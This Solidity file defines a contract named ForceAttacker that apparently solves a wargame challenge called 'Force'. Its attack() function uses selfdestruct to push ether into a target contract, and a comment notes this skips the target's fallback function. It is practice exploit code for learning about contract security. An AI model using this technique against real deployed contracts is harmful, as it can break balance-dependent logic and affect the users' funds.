// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Force {
    function _fallback() external payable  ;
}

contract ForceAttacker {

    function sendViaCall(address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    // The selfdestruct(address) function removes all bytecode from the contract address and sends all ether stored to the specified address. 
    // If this specified address is also a contract, no functions (including the fallback) get called.
    function attack(address payable _to) public payable {

        address payable addr = payable(address(_to));
        selfdestruct(addr);
    }

    fallback() external payable {
    }

    receive() external payable {
    }
}